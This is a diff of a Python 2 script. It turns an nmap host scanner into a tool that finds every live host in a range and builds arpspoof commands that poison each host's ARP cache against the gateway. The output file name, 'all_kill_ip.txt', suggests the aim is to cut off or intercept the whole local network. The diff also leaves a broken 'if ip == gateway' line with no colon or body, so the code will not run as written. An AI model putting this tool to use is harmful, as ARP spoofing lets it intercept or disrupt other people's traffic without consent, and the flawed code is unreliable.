@@ -5,10 +5,12 @@ import threading
 import re as R
 
 ip_range = str(raw_input('[*]Input the IP range(xx.xx.xx.xx-xx):'))
-cmd = 'nmap -sn %s | grep -o "%s.*\..*\..*\..*" > result.txt' % (
+interface = str(raw_input('[*]Interface:'))
+gateway = str(raw_input('[*]Gateway:'))
+cmd = 'nmap -sn %s | grep -o "%s.*\..*\..*\..*" > all_kill_ip.txt' % (
     ip_range, ip_range[0])
 system(cmd)
-fp = open('result.txt', 'r+')
+fp = open('all_kill_ip.txt', 'r+')
 lt = fp.readlines()
 fp.close()
 
@@ -17,11 +19,12 @@ print '[*] Total host:%d' % len(lt)
 
 def scan(line):
     pattern = '\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}'
-    line = R.findall(pattern, line)[0]
-    print '[*]Scanning ' + line
-    cmd = 'nmap ' + line + ' >> ip_info.txt && echo '' >> ip_info.txt'
-    system(cmd)
-    print '[*]Complete ' + line
+    ip = R.findall(pattern, line)[0]
+    if ip == gateway
+    print '[*]Scanning ' + ip
+    cmd = 'arpspoof -i %s -t %s %s' % (interface, ip, gateway)
+    print cmd
+    print '[*]Complete ' + ip
 
 for line in lt:
     thread = threading.Thread(target=scan, args=(line,))
